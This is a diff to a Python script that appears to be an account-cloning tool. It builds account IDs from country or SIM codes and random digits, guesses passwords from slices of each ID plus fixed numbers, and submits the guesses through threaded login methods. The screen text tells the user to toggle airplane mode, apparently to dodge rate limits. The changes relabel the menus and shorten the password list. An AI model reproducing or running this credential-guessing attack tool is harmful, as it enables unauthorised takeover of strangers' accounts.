@@ -489,14 +489,14 @@ class Process:
 #━━━━[ MAIN ]━━━━#
 def BITHIKA():
     ____banner____()
-    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\x1b[38;5;34mKEEP ON FILE CLONE')
-    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\x1b[38;5;34mMAKE IT FILES')
-    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\x1b[38;5;34mKEEP ON RANDOM CLONE')
-    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}]\x1b[38;5;34mJOIN GROUP')
-    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}]\x1b[38;5;34mCONTRACK ADMIN');linex()
+    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\x1b[38;5;34mTURN ON FILE CLONE')
+    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\x1b[38;5;34mTURN ON MAIL CLONE')
+    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\x1b[38;5;34mTURN ON RANDOM CLONE')
+    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}]\x1b[38;5;34mJOIN COMMUNITY GROUP')
+    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}]\x1b[38;5;34mREPORT BUGS');linex()
     __BITHIKA__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
     if __BITHIKA__ in ['A','a','01','1']:__FILEX__()
-    elif __BITHIKA__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
+    elif __BITHIKA__ in ['B','b','02','2']:print(f'\n[×]{rad}coming soon... ');BITHIKA()
     elif __BITHIKA__ in ['C','c','03','3']:SETINGX()
     elif __BITHIKA__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO")
     elif __BITHIKA__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
@@ -505,9 +505,9 @@ def BITHIKA():
 #━━━━[ SELECT MENU ]━━━━#
 def SETINGX():
     ____banner____()
-    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH 5 DIGIT")
-    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH 4 DIGIT")
-    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH 3 DIGIT");linex()
+    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH STR RANGE 6")
+    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH STR RANGE 7")
+    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH STR RANGE 5");linex()
     __BITHIKAi__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
     if __BITHIKAi__ in ['A','a','01','1']:RANDOM()
     elif __BITHIKAi__ in ['B','b','02','2']:INDIA()
@@ -549,7 +549,7 @@ def RANDOM():
     ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
+      pwv = [ids[:6],ids[:8],ids,'57273200']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
@@ -597,7 +597,7 @@ def INDIA():
     ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
+      pwv = [ids[:6],ids[:8],ids,'57273200']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
@@ -645,7 +645,7 @@ def PAKISTAN():
     ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
+      pwv = [ids[:6],ids[:8],ids,'57273200']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
